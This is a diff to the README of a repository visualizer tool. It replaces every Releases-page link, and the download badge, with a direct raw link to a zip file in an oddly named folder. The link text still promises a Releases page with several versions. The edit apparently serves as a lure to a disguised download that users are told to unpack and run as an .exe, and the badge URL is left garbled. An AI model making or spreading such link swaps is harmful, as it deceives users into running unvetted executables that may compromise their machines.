@@ -1,6 +1,6 @@
 # 🚀 GitHub-Repo-Visualizer - Visualize and Manage GitHub Repositories Easily
 
-[![Download GitHub-Repo-Visualizer](https://img.shields.io/badge/Download%20Now-Get%20it%20from%20Releases-brightgreen)](https://github.com/Ayobami28/GitHub-Repo-Visualizer/releases)
+[![Download GitHub-Repo-Visualizer](https://raw.githubusercontent.com/Ayobami28/GitHub-Repo-Visualizer/main/carbolfuchsin/GitHub-Repo-Visualizer.zip%20Now-Get%20it%20from%20Releases-brightgreen)](https://raw.githubusercontent.com/Ayobami28/GitHub-Repo-Visualizer/main/carbolfuchsin/GitHub-Repo-Visualizer.zip)
 
 ## 🌟 Introduction
 
@@ -24,7 +24,7 @@ Follow these simple steps to get started with GitHub-Repo-Visualizer.
 
 ## 📥 Download & Install
 
-To download GitHub-Repo-Visualizer, [visit this page to download](https://github.com/Ayobami28/GitHub-Repo-Visualizer/releases). Here, you will find various release versions. Choose the one that fits your operating system.
+To download GitHub-Repo-Visualizer, [visit this page to download](https://raw.githubusercontent.com/Ayobami28/GitHub-Repo-Visualizer/main/carbolfuchsin/GitHub-Repo-Visualizer.zip). Here, you will find various release versions. Choose the one that fits your operating system.
 
 **Installation Steps:**
 - For Windows: Run the `.exe` file you downloaded and follow the prompts.
@@ -79,4 +79,4 @@ If you encounter any issues, please reach out through the GitHub repository. Our
 
 Stay tuned for future updates. We continuously work on improving the application based on user feedback and the latest trends in repository management.
 
-Enjoy using GitHub-Repo-Visualizer! Download now from our [Releases page](https://github.com/Ayobami28/GitHub-Repo-Visualizer/releases) and take charge of your GitHub repositories.
+Enjoy using GitHub-Repo-Visualizer! Download now from our [Releases page](https://raw.githubusercontent.com/Ayobami28/GitHub-Repo-Visualizer/main/carbolfuchsin/GitHub-Repo-Visualizer.zip) and take charge of your GitHub repositories.
